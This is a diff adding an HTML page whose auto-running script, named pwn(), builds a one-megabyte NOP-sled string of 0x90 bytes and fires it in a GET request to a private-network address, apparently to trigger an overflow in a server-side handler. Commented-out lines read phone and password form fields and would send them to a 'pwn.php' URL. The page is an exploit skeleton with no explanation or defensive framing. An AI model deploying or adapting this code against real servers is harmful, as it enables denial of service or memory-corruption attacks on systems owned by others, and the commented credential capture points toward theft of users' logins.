@@ -1,0 +1,46 @@
+	<html>
+	<script >
+		function createXMLHttpRequest() {  
+			var xmlHttp;  
+			if (window.XMLHttpRequest) {  
+			    xmlHttp = new XMLHttpRequest();  
+			    if (xmlHttp.overrideMimeType)  
+					xmlHttp.overrideMimeType('text/xml');  
+			} else if (window.ActiveXObject) {  
+			    try {  
+					xmlHttp = new ActiveXObject("Msxml2.XMLHTTP");  
+			    } catch (e) {  
+					try {  
+					    xmlHttp = new ActiveXObject("Microsoft.XMLHTTP");  
+					} catch (e) {  
+					}  
+		 		   }  
+				}  
+			return xmlHttp;  
+		}  
+
+		function pwn() {
+			
+			//var phone=document.getElementById('user2').value;
+			//var password=document.getElementById('password2').value;
+			//var url = "pwn.php?phone="+phone+"&"+"password="+password;  
+
+			var nop="\u9090\u9090";
+			//1Mb 0x90
+			while(nop.length<=0x100000/2)
+			{
+				nop+=nop;
+			}
+			var url ="http://192.168.122.1/php/test1.pdf?"+nop;
+			alert(url); 
+			xmlHttp = createXMLHttpRequest();  
+    		xmlHttp.open("GET", url, true);
+    		//xmlHttp.onreadystatechange = callback;   
+    		xmlHttp.send(); 
+		}
+
+		pwn();
+	
+	</script>
+ 
+	</html>
